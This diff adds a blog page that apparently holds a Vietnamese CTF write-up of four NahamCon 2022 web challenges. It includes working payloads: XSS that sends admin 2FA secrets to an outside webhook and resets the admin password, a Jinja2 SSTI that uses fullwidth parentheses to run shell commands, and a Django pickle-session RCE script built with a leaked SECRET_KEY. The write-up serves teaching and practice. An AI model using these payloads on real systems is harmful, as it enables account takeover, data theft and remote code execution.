@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="en" data-mode="light">
+  <head prefix="og: http://ogp.me/ns#">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hugo 0.98.0">
+<meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<title>Nahamcon CTF2022 | d@rkmod3</title>
+
+
+
+
+
+
+<meta name="robots" content="index follow">
+
+
+
+
+  
+    <link rel="canonical" href="/posts/nahamconctf_2022/">
+  
+
+
+
+
+
+
+
+
+<meta property="og:site_name" content="d@rkmod3">
+<meta property="og:title" content="Nahamcon CTF2022">
+
+  <meta property="og:url" content="/posts/nahamconctf_2022/">
+
+
+
+
+
+
+
+  
+
+
+  <meta property="og:type" content="article">
+  
+  
+    <meta property="article:published_time" content="2022-05-02">
+    <meta property="article:modified_time" content="2022-05-02">
+    <meta property="og:updated_time" content="2022-05-02">
+  
+
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="theme-color" content="#222">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebSite",
+        "@id": ""
+      },
+      "headline": "Nahamcon CTF2022",
+      "description": "",
+      
+      "url": "\/posts\/nahamconctf_2022\/",
+      "inLanguage": "en",
+      "datePublished": "2022-05-02",
+      "dateModified": "2022-05-02",
+      "wordCount" : "788",
+      "publisher": {
+        "@type": "Person",
+        "name": ""
+      },
+      "author": {
+        "@type": "Person",
+        "name": "",
+        
+        
+      }
+    }
+  </script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.78522036ddf9f6185ddda21a1e9757b2153d186edb58d42839dfafe93bd833a5.css" integrity="sha256-eFIgNt359hhd3aIaHpdXshU9GG7bWNQoOd&#43;v6TvYM6U=" crossorigin="anonymous">
+
+
+
+<noscript>
+
+  
+  
+
+  
+    <meta name="theme-color" content="#1dbc91" media="(prefers-color-scheme: dark)">
+    <meta name="theme-color" content="#1f676b" media="(prefers-color-scheme: light)">
+  
+
+  
+  <link rel="stylesheet" href="/css/noscript.min.9bacd85b6f1d42296c56d3b8457d0c13a4e7f415c4ca5fc8affb6ed6b39cad72.css" integrity="sha256-m6zYW28dQilsVtO4RX0ME6Tn9BXEyl/Ir/tu1rOcrXI=" crossorigin="anonymous">
+
+</noscript>
+
+
+
+<link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<script src="/js/main.f1da21dfea83dc0c36cea0b202c14a97e00aedab567e32702eb120f5ab8d974b.js" integrity="sha256-8doh3&#43;qD3Aw2zqCyAsFKl&#43;AK7atWfjJwLrEg9auNl0s=" crossorigin="anonymous"></script>
+
+  </head>
+
+  <body>
+
+    <header>
+      
+
+  <a href="/">d@rkmod3</a>
+
+
+
+
+
+    </header>
+
+    <div class="filler">
+      
+
+  <main>
+    <article>
+      <header>
+        
+        <h1>Nahamcon CTF2022</h1>
+
+        
+          <section class="terms">
+            <ul><li><a class="btn" href="/tags/2fa/">2FA</a></li><li><a class="btn" href="/tags/pickleserializer/">PickleSerializer</a></li><li><a class="btn" href="/tags/unicode-normalization/">Unicode Normalization</a></li><li><a class="btn" href="/tags/xss/">XSS</a></li></ul>
+          </section>
+          <p>
+            
+              Published on <time datetime="2022-05-02">2022-05-02</time>
+            
+          </p>
+        
+        
+        
+        
+      </header>
+ 
+          <details class="toc" open>
+    <summary class="outline-dashed">
+      Contents
+    </summary>
+    
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#hacker-ts-hard">Hacker Ts (hard)</a></li>
+    <li><a href="#two-for-one--hard">Two For One  (hard)</a></li>
+    <li><a href="#deafcon-hard">Deafcon (hard)</a></li>
+    <li><a href="#poller-hard">Poller (hard)</a></li>
+  </ul>
+</nav>
+  </details>
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <h2 id="hacker-ts-hard"><a class="anchor" href="#hacker-ts-hard" title='Anchor for: Hacker Ts (hard).'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Hacker Ts (hard)</h2> 
+
+<p>Bài này cho chúng ta input text và sử dụng wkhtmltoimage để generate ra hình ảnh.</p>
+<p>Thử với htmlinjection:</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>/exploit?text=&lt;del%20style=&#34;color:red&#34;&gt;test&lt;/del&gt;&amp;color=%2324d600
+</code></pre><p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/ts_1.png"
+      
+    />
+
+  
+
+</p>
+<p>Thử xss 1 chút:</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>/exploit?text=&lt;del%20id=&#34;test&#34; style=&#34;color:red&#34;&gt;test&lt;/del&gt;&lt;script&gt;test.innerText=&#34;changethistext&#34;&lt;/script&gt;&amp;color=%2324d600
+</code></pre><p>Yah, chữ <code>test</code> đã chuyển thành <code>changethistext</code>, chứng tỏ thẻ <code>&lt;script&gt;</code> hoạt động. Nice!!!, như vậy ta ta chỉ cần lấy dữ liệu từ /admin là có được flag.
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/ts_2.png"
+      
+    />
+
+  
+
+</p>
+<p>Payload</p>
+<pre tabindex="0"><code class="language-js=" data-lang="js=">&lt;script&gt;
+	var result = document.createElement(&#34;p&#34;);
+	var data = new XMLHttpRequest();
+	data.open(&#34;GET&#34;,&#34;http://localhost:5000/admin&#34;,false);
+	data.send();
+	data = data.responseText;
+	result.innerText = data.substr(data.search(&#34;flag{&#34;), data.search(&#34;}&#34;));
+	document.body.appendChild(result);
+&lt;/script&gt;
+</code></pre><p>Ta có được flag
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/ts_3.png"
+      
+    />
+
+  
+
+</p>
+
+
+
+
+
+
+
+
+
+  <h2 id="two-for-one--hard"><a class="anchor" href="#two-for-one--hard" title='Anchor for: Two For One  (hard).'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Two For One  (hard)</h2> 
+
+<p>Bài này cho chúng ta đăng kí tài khoản, sau khi đăng kí sẽ gởi về 1 mã QRcode chứa token dùng để xác thực tài khoản.</p>
+<p>QRcode này thực ra chứa đường link dẫn đến <code>otpauth://totp/Fort%20Knox:d4rkmod3?secret=62JSAKUOAKHT2CXT&amp;issuer=Fort%20Knox</code>.</p>
+<p>Lấy secret từ response, mình dùng <a href="https://2fa.live/">https://2fa.live/</a> để generate ra OTP.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/2FA_1.png"
+      
+    />
+
+  
+
+</p>
+<p>Sau khi đăng nhập, ta nhận được nội dung như sau:
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/2FA_2.png"
+      
+    />
+
+  
+
+</p>
+<p>Như vậy ta có thể đoán được secret nằm ở tài khoản của admin.</p>
+<p>Vào phần setting -&gt; feeback test payload xss.</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>&lt;script&gt;
+fetch(&#39;http://iuxhte87.requestrepo.com&#39;);
+&lt;/script&gt;
+</code></pre><p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/2FA_3.png"
+      
+    />
+
+  
+
+</p>
+<p>Có response trả về từ adminbot.
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/2FA_4.png"
+      
+    />
+
+  
+
+</p>
+<p>Chú ý rằng cookie được set ở Host Only, do đó chúng ta không thể lấy trực tiếp cookie ở admin bot.</p>
+<p>Có 2 chức năng trong phần settings này mà ta có thể lợi dụng là <code>Change password</code> và <code>Reset 2FA</code>. Để đổi mật khẩu thì phải cần OTP mà muốn có OTP thì phải có secret.</p>
+<p>Craft payload để lấy secret. Flow của mình là bắt adminbot truy cập vào /reset2fa, sau đó send response tới webhook của mình.</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>&lt;script&gt;
+fetch(&#39;http://localhost:5000/reset2fa&#39;,{mode:&#39;no-cors&#39;, method:&#39;POST&#39;}).then(r=&gt;r.text()).then(data=&gt; fetch(&#39;http://iuxhte87.requestrepo.com&#39;, {method:&#39;POST&#39;, mode:&#39;no-cors&#39;, body: data}));
+&lt;/script&gt;
+</code></pre><p>TA-DA, đã có được secret:
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/2FA_5.png"
+      
+    />
+
+  
+
+</p>
+<p>Dùng 2fa.live để tạo ra OTP như trên. Bước tiếp theo ta chỉ cần đổi mật khẩu admin. Nhưng có 1 lưu ý là không thể sử dụng fetch API vì server có check cookie mà fetch chỉ có thể sendata mà không có cookie, do đó mình sử dụng XMLHttpRequest để include cookie vào request.</p>
+<p>Payload:</p>
+<pre tabindex="0"><code class="language-js=" data-lang="js=">&lt;script&gt;
+var url = &#34;http://localhost:5000/reset_password&#34;;
+load(url);
+function load(url){
+  var xhr = new XMLHttpRequest();
+
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === XMLHttpRequest.DONE) {
+      fetch(&#39;http://iuxhte87.requestrepo.com&#39;, {method:&#39;POST&#39;, mode:&#39;no-cors&#39;, body: xhr.responseText});
+    }
+  }
+
+  xhr.open(&#39;POST&#39;, url);
+  xhr.withCredentials = true;
+  xhr.setRequestHeader(&#34;Content-Type&#34;, &#34;application/json;charset=UTF-8&#34;);
+  xhr.send(&#39;{&#34;otp&#34;:&#34;123122&#34;,&#34;password&#34;:&#34;a&#34;,&#34;password2&#34;:&#34;a&#34;}&#39;);
+}
+&lt;/script&gt;
+</code></pre><p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/2FA_6.png"
+      
+    />
+
+  
+
+</p>
+<p>Đăng nhập với tài khoản admin, với password ta đã đổi ở trên, cùng với OTP generate ra từ secret ta được flag.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/2FA_7.png"
+      
+    />
+
+  
+
+</p>
+<p>Có một điểm mình nhận ra sau khi kết thúc giải là endpoint /show_secret có thể lấy flag thông qua OTP :)).</p>
+
+
+
+
+
+
+
+
+
+  <h2 id="deafcon-hard"><a class="anchor" href="#deafcon-hard" title='Anchor for: Deafcon (hard).'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Deafcon (hard)</h2> 
+
+<p>Bài này cho chúng ta nhập vào 2 input là name và email rồi generate ra 1 pdf qua wkhtmltopdf 0.12.5.</p>
+<p>Xem qua về những lỗ hổng của wkhtmltopdf thì mình thấy tồn tại 2 lỗ hổng LOCAL FILE INCLUSION và SERVER-SIDE REQUEST FORGERY (SSRF), tuy nhiên input của chúng ta có 1 số hạn chế như sau:</p>
+<p>Param <code>name</code> chỉ được dùng những kí tự từ a-z 0-9 và dấu cách.</p>
+<p>Param <code>email</code> phải theo chuẩn RFC 5322.</p>
+<p>==&gt; Loại bỏ ý tưởng LFI và SSRF.</p>
+<p>Test với payload quốc dân {{7*7}} vào param email -&gt; web có lỗ hổng SSTI. Ở đây, webserver đang sử dụng framework Flask với template Jinja2.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/ssti_1.png"
+      
+    />
+
+  
+
+</p>
+<p>Thử với <code>{{config.items()}}</code>, nhận được lỗi như sau:
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/ssti_2.png"
+      
+    />
+
+  
+
+</p>
+<p>Vấn đề đặt ra là muốn sử dụng được function thì ta phải dùng cặp dấu ().</p>
+<p>Thử bypass bằng unicode, tìm kiếm trên trang
+<a href="https://unicode-table.com/en/search/?q=Parenthesis">https://unicode-table.com/en/search/?q=Parenthesis</a>, mình thấy rằng ta có thể sử dụng Fullwidth Left Parenthesis (U+FF08) và Fullwidth Right Parenthesis (U+FF09).</p>
+<p>Nice, tới đây ta chỉ cần craft payload để lấy flag.</p>
+<p>Do định dạng email không được chứa dấu cách nên mình dùng request.cookies để bypass cho lẹ.</p>
+<p>Final payload:</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>/ticket?name=a&amp;email={{lipsum.__globals__.os.popen（request.cookies.command）.read（）}}@d4rkmod3.com
+</code></pre><p>ls
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/ssti_3.png"
+      
+    />
+
+  
+
+</p>
+<p>cat flag.txt
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/ssti_4.png"
+      
+    />
+
+  
+
+</p>
+
+
+
+
+
+
+
+
+
+  <h2 id="poller-hard"><a class="anchor" href="#poller-hard" title='Anchor for: Poller (hard).'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Poller (hard)</h2> 
+
+<p>Bài này cho chúng ta source github, webserver sử dụng django 4.0.4 (lastest version).</p>
+<p>Dựng server rồi debug, mình bị stuck 1 vài tiếng vì không tìm ra vuln, đọc kĩ lại các file config mình thấy 1 số điều thú vị như sau:</p>
+<p><code>DEBUG = True</code> -&gt; mặc định sẽ được set là False</p>
+<p><code>SESSION_SERIALIZER = &quot;django.contrib.sessions.serializers.PickleSerializer&quot;</code></p>
+<p>Đợi đã &hellip; PickleSerialize được khuyến cáo là không nên sử dụng vì có thể dẫn đến Remote Code Execution (RCE).</p>
+<p><a href="https://docs.djangoproject.com/en/4.0/topics/http/sessions/">https://docs.djangoproject.com/en/4.0/topics/http/sessions/</a></p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/poller_1.png"
+      
+    />
+
+  
+
+</p>
+<p>Hành trình tìm SECRET_KEY bắt đầu :))</p>
+<p>Xem qua history commit của tác giả, mình leak được SECRET_KEY qua commit này:</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="/posts/img/NahamconCTF2022/poller_2.png"
+      
+    />
+
+  
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>SECRET_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;django-insecure-fnxu@v&amp;(wqd%77m6p#k_s2+n5na-bqe!m)^zu)9typ#0c&amp;8o6!&#34;</span>
+</span></span></code></pre></div><p>Mình exploit được chall này sau khi đọc qua bài viết này:
+<a href="https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/">https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/</a></p>
+<p>Tuy nhiên mình sử dụng python3 nên custom lại script 1 chút:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> django.core.signing<span style="color:#f92672">,</span> django.contrib.sessions.serializers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SECRET_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;77m6p#v&amp;(wk_s2+n5na-bqe!m)^zu)9typ#0c&amp;@qd</span><span style="color:#e6db74">%8o</span><span style="color:#e6db74">6!&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PickleRce</span>(object):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system,(<span style="color:#e6db74">&#34;sleep 5&#34;</span>,))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> django<span style="color:#f92672">.</span>core<span style="color:#f92672">.</span>signing<span style="color:#f92672">.</span>dumps(PickleRce(),key<span style="color:#f92672">=</span>SECRET_KEY,serializer<span style="color:#f92672">=</span>django<span style="color:#f92672">.</span>contrib<span style="color:#f92672">.</span>sessions<span style="color:#f92672">.</span>serializers<span style="color:#f92672">.</span>PickleSerializer,salt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;django.contrib.sessions.backends.signed_cookies&#34;</span>,compress<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(cookie)
+</span></span></code></pre></div><p>Set cookie userid lại ta thấy response trả về từ server bị delay 5s, như vậy ta có thể reverse shell để lấy được flag.</p>
+
+
+        
+    </article>
+  </main>
+
+
+    </div>
+    
+    <footer>
+      
+
+
+  
+
+    
+
+    
+      
+      
+    
+    
+    <p>Welcome to my lord.</p>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="req-js">
+  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#1f676b" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#1f676b"><option value="#1dbc91"></datalist>
+</section>
+
+
+
+  <noscript>
+    <p class="noscript">Unable to execute JavaScript. Some features were disabled.</p>
+  </noscript>
+
+
+
+    </footer>
+    
+    
+    
+
+    
+    
+
+  </body>
+</html>
